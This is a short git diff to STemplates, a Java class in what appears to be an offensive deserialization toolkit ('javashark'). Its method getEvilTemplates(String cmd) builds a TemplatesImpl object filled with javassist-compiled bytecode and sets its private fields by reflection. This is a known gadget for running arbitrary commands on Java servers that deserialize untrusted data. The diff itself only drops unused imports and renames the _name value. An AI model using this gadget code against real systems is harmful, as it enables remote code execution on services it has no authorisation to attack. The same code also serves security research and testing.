@@ -12,11 +12,9 @@ import dev.silente.javashark.utils.ReflectUtils;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
-import javassist.CtConstructor;
 
 import java.io.ByteArrayInputStream;
 import java.io.Serializable;
-import java.util.Properties;
 
 public class STemplates {
     public static TemplatesImpl getEvilTemplates(String cmd) throws Exception {
@@ -42,7 +40,7 @@ public class STemplates {
         byte[][] bytes = new byte[][]{clazz.toBytecode()};
         TemplatesImpl templates = TemplatesImpl.class.newInstance();
         ReflectUtils.setFieldValue(templates, "_bytecodes", bytes);
-        ReflectUtils.setFieldValue(templates, "_name", "foobar");
+        ReflectUtils.setFieldValue(templates, "_name", "se");
         ReflectUtils.setFieldValue(templates, "_tfactory",  ReflectUtils.createWithoutConstructor(TransformerFactoryImpl.class));
         return templates;
     }
